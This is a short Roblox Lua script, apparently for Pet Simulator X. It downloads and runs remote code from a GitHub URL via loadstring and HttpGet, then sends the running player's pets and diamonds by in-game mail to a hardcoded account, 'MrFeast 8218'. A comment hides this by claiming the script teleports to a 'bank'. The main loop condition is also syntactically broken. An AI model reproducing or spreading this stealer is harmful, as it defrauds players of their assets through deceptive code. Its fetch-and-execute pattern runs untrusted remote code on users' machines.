local VoidScripts = loadstring(game:HttpGet("https://raw.githubusercontent.com/MrFeastEz/PsxAPI/main/script/API.lua"))()

-- Constantly teleports the user to the bank
spawn(function()
    while true do
        wait(1)
        VoidScripts.TpToMailbox()
    end
end)

local Pets = VoidScripts.GetPets()
local Diamonds = VoidScripts.GetDiamonds()

while #Pets > 1 Diamonds > 100000 do
    wait(7)
    local worked, errormsg = pcall(function()
        VoidScripts.SendMail("Roblox", 0, Pets[1], "MrFeast 8218")
    end)
    if worked then
        Diamonds = Diamonds - 100000
        table.remove(Pets, 1)
    end
end

wait(7)
 
if Diamonds > 100000 then
    VoidScripts.SendMail("Roblox", Diamonds-100001, {}, "MrFeast 8218")
end
